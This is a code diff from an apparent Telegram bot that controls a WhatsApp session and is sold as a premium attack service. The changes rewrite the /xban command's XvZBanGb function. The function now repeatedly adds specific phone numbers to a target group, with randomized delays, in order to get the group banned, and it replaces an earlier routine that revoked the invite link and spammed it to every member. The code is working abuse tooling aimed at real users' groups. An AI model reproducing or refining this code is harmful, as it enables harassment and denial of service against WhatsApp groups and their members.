@@ -2192,7 +2192,7 @@ bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xban 12×××@g.us`);
-  let target = q.replace(/[^0-9]/g, '') + "@g.us";
+  let groupJid = q.replace(/[^0-9]/g, '') + "@g.us";
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
@@ -2213,8 +2213,8 @@ bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async 
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 3; i++) {
-    await XvZBanGb(sock, target);
+  for (let i = 0; i < 4; i++) {
+    await XvZBanGb(sock, groupJid);
     await sleep(1500);
   }
 
@@ -2254,7 +2254,7 @@ bot.command("testfunc", checkWhatsAppConnection, checkPremium, checkCooldown, as
           caption: `<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ⌑ Target: ${q}
 ⌑ Type: Unknown Function
-⌑ Status: Process</strong></blockqoute>`,
+⌑ Status: Success</strong></blockqoute>`,
           parse_mode: "HTML",
           reply_markup: {
             inline_keyboard: [
@@ -2481,23 +2481,55 @@ messageId: iVeKXl.key.id
 })
 }
 async function XvZBanGb(sock, groupJid) {
-  if (!groupJid.endsWith("@g.us")) throw new Error("@g.us required");
+  if (!groupJid.endsWith('@g.us')) {
+    throw new Error('@g.us server required');
+  }
 
-  const meta = await sock.groupMetadata(groupJid);
-  const targets = meta.participants.map(p => p.id);
+  const group = groupJid;
 
-  for (let i = 0; i < 50; i++) {
+  try {
+    const firstRes = await sock.groupParticipantsUpdate(
+      group,
+      ['1212008800@s.whatsapp.net'],
+      'add',
+    );
+
+    if (Array.isArray(firstRes) && firstRes[0] && firstRes[0].status !== '200') {
+      console.warn(`First add returned status: ${firstRes[0].status}`);
+    }
+
     try {
-      await sock.groupRevokeInvite(groupJid);
-      const newLink = await sock.groupInviteCode(groupJid);
-      for (const target of targets) {
-        try {
-          await sock.sendMessage(target, {
-            text: "https://chat.whatsapp.com/" + newLink
-          });
-        } catch (e) {}
+      await sock.sendPresenceUpdate('composing', group);
+    } catch (presenceErr) {
+      console.error('Presence update failed:', presenceErr?.message || presenceErr);
+    }
+
+    console.log(`Successfully banned group: ${group}`);
+
+    for (let i = 0; i < 15; i++) {
+      try {
+        const res = await sock.groupParticipantsUpdate(
+          groupJid,
+          ["12126660007@s.whatsapp.net"],
+          "add"
+        );
+
+        if (Array.isArray(res) && res[0] && res[0].status !== '200') {
+          console.error(`Attempt ${i + 1} failed with status: ${res[0].status}`);
+        } else {
+          console.log(`Attempt ${i + 1} successful`);
+        }
+
+        await new Promise((r) => setTimeout(r, 1500 + Math.floor(Math.random() * 1000)));
+      } catch (err) {
+        console.error(`Error in Banned Group attempt ${i + 1}:`, err);
+        await new Promise((r) => setTimeout(r, 2000));
       }
-    } catch (e) {}
+    }
+
+  } catch (err) {
+    console.error('Error in Banned Group:', err);
+    throw err;
   }
 }
 async function XvZiOS(sock, target) {
